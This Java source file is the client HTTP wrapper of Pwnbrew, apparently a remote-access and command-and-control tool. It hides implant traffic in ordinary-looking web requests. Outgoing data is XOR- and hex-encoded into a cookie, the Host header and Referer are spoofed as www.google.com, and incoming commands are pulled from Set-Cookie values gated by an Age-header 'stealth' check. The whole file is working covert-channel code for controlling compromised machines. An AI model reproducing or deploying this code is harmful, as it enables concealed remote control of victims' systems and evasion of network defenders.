/*

Copyright (C) 2013-2014, Securifera, Inc 

All rights reserved. 

Redistribution and use in source and binary forms, with or without modification, 
are permitted provided that the following conditions are met:

    * Redistributions of source code must retain the above copyright notice,
	this list of conditions and the following disclaimer.

    * Redistributions in binary form must reproduce the above copyright notice,
	this list of conditions and the following disclaimer in the documentation 
	and/or other materials provided with the distribution.

    * Neither the name of Securifera, Inc nor the names of its contributors may be 
	used to endorse or promote products derived from this software without specific
	prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS 
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY 
AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER 
OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON 
ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT 
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, 
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

================================================================================

Pwnbrew is provided under the 3-clause BSD license above.

The copyright on this package is held by Securifera, Inc

*/


/*
 *  HttpWrapper.java
 *
 *  Created on July 8, 2013
 */
package pwnbrew.network.http;

import java.io.IOException;
import java.nio.ByteBuffer;
import java.util.Arrays;
import java.util.logging.Level;
import pwnbrew.ClientConfig;
import pwnbrew.log.LoggableException;
import pwnbrew.log.RemoteLog;
import pwnbrew.manager.DataManager;
import pwnbrew.network.Message;
import pwnbrew.network.RegisterMessage;
import pwnbrew.selector.SocketChannelHandler;
import pwnbrew.utilities.DebugPrinter;
import pwnbrew.utilities.SocketUtilities;
import pwnbrew.utilities.Utilities;

/**
 *
 *  
 */
public class ClientHttpWrapper extends HttpWrapper {

    private static final String NAME_Class = ClientHttpWrapper.class.getSimpleName();
    
    private static final int STEALTH_COOKIE_B64 = 5;
       
    //==========================================================================
    /**
     * Constructor
     *
    */
    public ClientHttpWrapper(){
    
    };
    
    //===============================================================
    /**
     *  Process the HTTP header, extract the data from it, and pass the message
     * on to the message handler.
     * 
     * @param aLine 
     */
    @Override
    void processHeader( SocketChannelHandler passedHandler ) {
    
        if( currentHeader != null ){
            
            //Get the accept language 
            String ageField = currentHeader.getOption( Http.AGE );
            if( ageField != null ){

                //Try an parse the field
                try {
                    
                    //Split on the semi-colon separater
                    int ageInt = Integer.parseInt(ageField);
                    byte[] ctrlMsg = getMessageBytes( ageInt );

                    //Create a control message
                    if( ctrlMsg != null ){

                        //Handle the message
                        ByteBuffer msgBB = ByteBuffer.wrap(ctrlMsg);
                        byte type = msgBB.get();
                        if( DataManager.isValidType( type ) ){

                            //Get the length
                            byte[] msgLenArr = new byte[ Message.MSG_LEN_SIZE ];
                            msgBB.get(msgLenArr);

                            //Verify that it matches
                            int msgLen = SocketUtilities.byteArrayToInt(msgLenArr);
                            if( msgLen == msgBB.remaining()){
                                byte[] msgBytes = new byte[msgLen];
                                msgBB.get(msgBytes);
                                
                                if( type == Message.REGISTER_MESSAGE_TYPE ){

                                    RegisterMessage aMsg = RegisterMessage.getMessage( ByteBuffer.wrap( msgBytes ));                                                
                                    aMsg.evaluate(passedHandler.getPortRouter().getPortManager());

                                } else {

                                    //Get dest id
                                    byte[] dstHostId = Arrays.copyOfRange(msgBytes, 4, 8);
                                    int dstId = SocketUtilities.byteArrayToInt(dstHostId);

                                    try{
                                        DataManager.routeMessage(  passedHandler.getPortRouter(), type, dstId, msgBytes );
                                    } catch(Exception ex ){
                                        RemoteLog.log( Level.SEVERE, NAME_Class, "receive()", ex.toString(), ex);
                                    }   
                                }
                            } else {
                                RemoteLog.log( Level.WARNING, NAME_Class, "processHeader()", "Message size doesn't match remaing size.", null);
                            }
                        }
                    }

                } catch ( NumberFormatException ex){

                    //Do nothing because it doesn't fit the criteria
                    ex = null;
                    
                } catch (IOException ex) {

                    //Do nothing because it doesn't fit the criteria
                    ex = null;
                    
                } catch (LoggableException ex) {
                    //Do nothing because it doesn't fit the criteria
                    ex = null;
                }               
            }
        }
    }
    
      //===============================================================
    /**
     *  Returns a ByteBuffer with the necessary bytes in it.
     * 
     * @param passedBytes
     * @return 
    */
    @Override
    public ByteBuffer wrapBytes( byte[] passedBytes ) {
         
        //Allocate and add the bytes from the message
        Http aHttpMsg = Http.getGeneric( Http.GET );       
        aHttpMsg.setOption( Http.REFERER, "http://www.google.com/");
        aHttpMsg.setOption( Http.USER_AGENT, "Mozilla/5.0");
        
        //See if the host header has been set
        String hostHeader = ClientConfig.getConfig().getHostHeader();
        if( hostHeader == null )
            hostHeader = "www.google.com";
        
        DebugPrinter.printMessage(NAME_Class, "Host Header: " + hostHeader);
        aHttpMsg.setOption( Http.HOST, hostHeader);        
        if( passedBytes.length > 0 ){
            
            //XOR the bytes
            byte[] encodedBytes = Utilities.xorData(passedBytes, XOR_STRING.getBytes());
            
            //Get a hex string representation
            String encodedByteStr = SocketUtilities.toString(encodedBytes).replace(" ", "");
            StringBuilder aSB = new StringBuilder()
                    .append(COOKIE_REF).append("=").append( encodedByteStr );            
            aHttpMsg.setOption(Http.COOKIE, aSB.toString());
            aHttpMsg.setOption(Http.ACCEPT_LANGUAGE, "en-us, en;q=0.5");
            
        }
              
        //Add the bytes
        int httpLen = aHttpMsg.getLength();
        ByteBuffer aByteBuffer = ByteBuffer.allocate( httpLen);
        aHttpMsg.append(aByteBuffer);
         
        return aByteBuffer;
    }
    
    //===============================================================
    /**
     *  Return the message bytes.
     * 
     * @param aLine 
     */
    private byte[] getMessageBytes(int stealthNum) throws IOException {
        
        byte[] msgBytes = null;
        if( stealthNum % STEALTH_COOKIE_B64 == 0 ){
           
            //Get the cookie
            String cookieVal = currentHeader.getOption( Http.SET_COOKIE );
            if( cookieVal.startsWith(COOKIE_REF) ){
                String[] cookieArr = cookieVal.split("=");
                if( cookieArr.length > 1 ){
                    String hexString = cookieArr[1];
                    byte[] xorBytes = SocketUtilities.hexStringToByteArray(hexString);
                        
                    //XOR the bytes
                    msgBytes = Utilities.xorData(xorBytes, XOR_STRING.getBytes());
                }
            }
         
        }  
        return msgBytes;
    }   
    
    
}
